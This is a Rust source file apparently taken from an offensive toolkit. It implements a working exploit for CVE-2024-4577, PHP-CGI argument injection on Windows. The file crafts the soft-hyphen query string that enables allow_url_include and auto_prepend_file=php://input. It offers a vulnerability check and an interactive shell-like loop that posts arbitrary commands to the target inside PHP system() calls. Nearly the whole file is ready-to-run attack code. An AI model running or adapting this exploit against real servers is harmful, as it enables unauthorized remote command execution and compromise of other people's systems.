use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::io::Write;
use std::time::Duration;
// use crate::utils::{normalize_target, prompt_yes_no}; // standard utils if available, mimicking other modules

/// PHP CGI Argument Injection (CVE-2024-4577)
/// Exploit for PHP running on Windows via XAMPP or similar setups.
///
/// Credits:
/// - Discovered by Orange Tsai
/// - PoC logic based on watchTowr Labs

const DEFAULT_TIMEOUT_SECS: u64 = 10;

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Normalize target
    let url = if target.starts_with("http://") || target.starts_with("https://") {
        target.to_string()
    } else {
        format!("http://{}", target)
    };
    let url = url.trim_end_matches('/');

    println!("[*] Target: {}", url.cyan());

    // Prompt for check or exploit
    println!();
    println!("{}", "[*] Select operation mode:".cyan());
    println!("  1. Check vulnerability (safe)");
    println!("  2. Execute command (RCE)");
    println!();
    
    print!("{}", "Select option [1-2]: ".green());
    use std::io::Write;
    std::io::stdout().flush()?;
    let mut choice = String::new();
    std::io::stdin().read_line(&mut choice)?;
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;

    match choice.trim() {
        "1" => check_vuln(&client, url).await?,
        "2" => exploit(&client, url).await?,
        _ => println!("{}", "[-] Invalid option".red()),
    }
    
    Ok(())
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   PHP CGI Argument Injection (CVE-2024-4577)              ║".cyan());
    println!("{}", "║   Target: Windows PHP (XAMPP etc.)                        ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}

async fn check_vuln(client: &Client, url: &str) -> Result<()> {
    println!("{}", "[*] Checking for vulnerability...".yellow());
    
    // Simple echo check
    let exploit_url = format!("{}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", url);
    let payload = "<?php echo 'VULNERABLE_CVE_2024_4577'; die; ?>";
    
    let resp = client.post(&exploit_url)
        .body(payload)
        .send()
        .await?;
        
    let text = resp.text().await?;
    if text.contains("VULNERABLE_CVE_2024_4577") {
        println!("{}", "[+] Target seems VULNERABLE!".green().bold());
        Ok(())
    } else {
        println!("{}", "[-] Target does not appear vulnerable.".red());
        Ok(())
    }
}

async fn exploit(client: &Client, url: &str) -> Result<()> {
    println!("{}", "[*] Entering RCE mode...".yellow());
    
    loop {
        print!("{}", "php> ".green().bold());
        std::io::stdout().flush()?;
        let mut cmd = String::new();
        std::io::stdin().read_line(&mut cmd)?;
        let cmd = cmd.trim();
        
        if cmd.is_empty() { continue; }
        if cmd == "exit" || cmd == "quit" { break; }
        
        let exploit_url = format!("{}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", url);
        // We use system() to execute command
        let payload = format!("<?php system('{}'); die; ?>", cmd);
        
        match client.post(&exploit_url).body(payload).send().await {
            Ok(resp) => {
                let text = resp.text().await?;
                println!("{}", text);
            }
            Err(e) => println!("[-] Request failed: {}", e),
        }
    }
    Ok(())
}
